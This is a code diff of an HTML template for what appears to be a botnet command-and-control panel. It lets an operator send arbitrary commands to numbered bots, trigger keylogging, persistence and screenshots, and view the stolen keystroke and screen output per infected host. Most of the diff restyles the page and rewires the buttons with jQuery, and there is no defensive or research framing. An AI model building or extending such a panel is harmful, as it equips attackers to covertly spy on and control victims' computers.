@@ -1,3 +1,4 @@
+{% set str = '' %}
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -39,7 +40,9 @@
         }
         .content {
             margin-left: 240px;
-            padding: 20px;
+            padding: 5px;
+            padding-top: 10px;
+            margin-top: 5px;
         }
         img {
             display: block;
@@ -92,12 +95,13 @@
             color: #FFF842;
         }
         .container td {
+            font-family: 'Impact', sans-serif;
             font-weight: normal;
-            font-size: 1em;
+            font-size: 14px;
             -webkit-box-shadow: 0 2px 2px -2px #0E1119;
             -moz-box-shadow: 0 2px 2px -2px #0E1119;
             box-shadow: 0 2px 2px -2px #0E1119;
-            max-height: 10px;
+            line-height: 1px;
             overflow: hidden;
             text-overflow: ellipsis;
         }
@@ -105,13 +109,13 @@
             text-align: left;
             overflow: hidden;
             width: 80%;
-            margin: 0 auto;
+            margin: 0 265px;
             display: table;
             padding: 0 0 8em 0;
         }
         .container td, .container th {
-            padding-bottom: 2%;
-            padding-top: 2%;
+            padding-bottom: 1%;
+            padding-top: 1%;
             padding-left: 2%;
         }
         .container tr:nth-child(odd) {
@@ -145,8 +149,8 @@
         }
         .list-type4 {
             text-align: center;
-            margin-top: 10px;
-            margin-bottom: 10px;
+            margin-top: 5px;
+            margin-bottom: 5px;
         }
         .list-type4 ol {
             list-style-type: none;
@@ -178,7 +182,7 @@
             display: flex;
             font-family: 'Impact', sans-serif;
             font-size: 25px;
-            margin-right: 5px;
+            margin-left: 100px;
             flex-direction: row;
             align-items: center;
             justify-content: center;
@@ -222,23 +226,23 @@
 <body>
     <div class="sidebar">
         <img src="{{ url_for('static', filename='img/Lion.png') }}" alt="Logo" class="logo">
-        <a class="active" href="{{ url_for('dashboard') }}"><img src="{{ url_for('static', filename='img/dashboard_icon.png') }}" alt="Dashboard Icon" class="avatar"> Dashboard</a>
+        <a href="{{ url_for('dashboard') }}"><img src="{{ url_for('static', filename='img/dashboard_icon.png') }}" alt="Dashboard Icon" class="avatar"> Dashboard</a>
+        <a href="{{ url_for('modules') }}"><img src="{{ url_for('static', filename='img/modules_icon.png') }}" alt="Modules Icon" class="avatar"> Modules</a>
         <a href="{{ url_for('commands') }}"><img src="{{ url_for('static', filename='img/commands_icon.png') }}" alt="Commands Icon" class="avatar"> Commands</a>
         <a href="{{ url_for('logout') }}"><img src="{{ url_for('static', filename='img/logout_icon.png') }}" alt="Logout Icon" class="avatar"> Logout</a>
     </div>
-    <div class="content">
-        <form id="stuff" method="post" name="stuff">
-            <div class="sendcommands">
-                <label for="idNumber">ID:</label>
-                <input type="text" id="idNumber" name="idNumber" placeholder="Enter Bot ID">
-                <label for="command">COMMAND:</label>
-                <input type="text" id="command" name="command" placeholder="Enter Command">
-                <button type="submit" id="submit" onclick="check(this.form)">SEND</button>
-                <button type="button" onclick="startKeylogger(event)">KEYLOGGER</button>
-                <button type="button" onclick="enablePersistence(event)">PERSISTENCE</button>
-                <button type="button" onclick="takeScreenshot(event)">SCREENSHOT</button>
-            </div>
-        </form>
+    <form id="commandForm" method="post" name="commandForm">
+        <div class="sendcommands">
+            <label for="idNumber">ID:</label>
+            <input type="text" id="idNumber" name="idNumber" placeholder="Enter Bot ID">
+            <label for="command">COMMAND:</label>
+            <input type="text" id="command" name="command" placeholder="Enter Command">
+            <button type="submit" id="submit">SEND</button>
+            <button type="button" id="startKeylogger">KEYLOGGER</button>
+            <button type="button" id="enablePersistence">PERSISTENCE</button>
+            <button type="button" id="takeScreenshot">SCREENSHOT</button>
+        </div>
+    </form>
         {{ commandStatus }}
         <table align="center" class="container">
         <thead>
@@ -250,57 +254,54 @@
         </tr>
         </thead>
         <tbody>
-        {% for task in taskDb %}
-            <tr>
-                <td>{{ task.idNum }}</td>
-                <td>{{ task.hostname }}</td>
-                <td>{{ task.commandSent }}</td>
-                <td>
-                    {% if '/receivedData/screenshots' in task.output %}
-                        <img width="500" height="200" src="{{ url_for('static', filename=task.output) }}">
-                    {% elif '/receivedData/keylogs' in task.output %}
-                        <a style="color:whitesmoke" href="{{ url_for('static', filename=task.output) }}">Click here for keylog file</a>
-                    {% else %}
-                        <pre>{{ task.output }}</pre>
-                    {% endif %}
-                </td>
-            </tr>
-        {% endfor %}
+            {% for task in taskDb[::-1] %}
+                <tr>
+                    <td>{{ task.idNum }}</td>
+                    <td>{{ task.hostname | default('N/A') }}</td>
+                    <td>{{ task.commandSent }}</td>
+                    <td>
+                        {% if task.commandSent == 'keylogger' %}
+                            {% if 'Keylogger started' in task.output %}
+                                <p>Keylogger started</p>
+                            {% elif 'Keylogger start failed' in task.output %}
+                                <p>Keylogger start failed</p>
+                            {% endif %}
+                        {% elif task.commandSent == 'screenshot' %}
+                            {% if 'Screenshot taken' in task.output %}
+                                <p>Screenshot taken</p>
+                            {% elif 'Error taking screenshot' in task.output %}
+                                <p>Error taking screenshot</p>
+                            {% endif %}
+                        {% elif task.commandSent == 'persistence' %}
+                            {% if 'Persistence Command executed successfully' in task.output %}
+                                <p>Persistence Command executed successfully</p>
+                            {% elif 'Persistence Command execution Failed' in task.output %}
+                                <p>Persistence Command execution Failed</p>
+                            {% endif %}
+                        {% else %}
+                            <pre>{{ task.output }}</pre>
+                        {% endif %}
+                    </td>              
+                </tr>
+            {% endfor %}
         </tbody>
     </table>
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
     <script>
-        function sendCommand(taskType) {
-            var botId = document.getElementById('idNumber').value;
-            var commandInput = document.getElementById('command').value.trim();
-            var formattedCommand = 'cmd "' + commandInput + '"';
-            $.ajax({
-                url: '/execute_command',
-                method: 'POST',
-                data: {
-                    botId: botId,
-                    command: formattedCommand
-                },
-                success: function(response) {
-                    handleResponse(response);
-                },
-                error: function(xhr, status, error) {
-                    console.error('Error executing command:', error);
-                }
+        $(document).ready(function() {
+            $("#startKeylogger").click(function() {
+                $("#command").val("keylogger");
+                $("#commandForm").submit();
             });
-        }
-        function handleResponse(response) {
-            console.log(response);
-        }
-        function startKeylogger() {
-            sendCommand('keylogger');
-        }
-        function enablePersistence() {
-            sendCommand('persistence');
-        }
-        function takeScreenshot() {
-            sendCommand('screenshot');
-        }
-    </script>    
+            $("#enablePersistence").click(function() {
+                $("#command").val("persistence");
+                $("#commandForm").submit();
+            });
+            $("#takeScreenshot").click(function() {
+                $("#command").val("screenshot");
+                $("#commandForm").submit();
+            });
+        });
+    </script>
 </body>
 </html>
